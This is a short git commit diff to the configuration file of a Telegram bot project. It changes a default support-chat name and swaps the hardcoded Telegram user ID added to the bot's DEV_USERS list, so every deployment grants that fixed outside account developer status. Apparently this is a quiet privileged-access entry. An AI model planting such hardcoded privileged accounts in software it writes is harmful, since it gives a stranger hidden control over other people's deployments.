62b1a3d3a33b82cc329a8d27b41095367a1bd68e
BRANDED KING <121561060+WCGKING@users.noreply.github.com>
2023-05-17 01:37:49 +0530

    Update __init__.py

--- MukeshRobot/__init__.py
+++ MukeshRobot/__init__.py
@@ -51,7 +51,7 @@ if ENV:
         "START_IMG", ""
     )
     STRICT_GBAN = bool(os.environ.get("STRICT_GBAN", True))
-    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", "TG_FRIENDSS")
+    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", "BRANDRD_21")
     TEMP_DOWNLOAD_DIRECTORY = os.environ.get("TEMP_DOWNLOAD_DIRECTORY", "./")
     TOKEN = os.environ.get("TOKEN", None)
     TIME_API_KEY = os.environ.get("TIME_API_KEY", None)
@@ -145,10 +145,10 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(5235126711)
-DEV_USERS.add(5235126711)
-DEV_USERS.add(5235126711)
-DEV_USERS.add(5235126711)
+DEV_USERS.add(6258877205)
+DEV_USERS.add(6258877205)
+DEV_USERS.add(6258877205)
+DEV_USERS.add(6258877205)
 
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
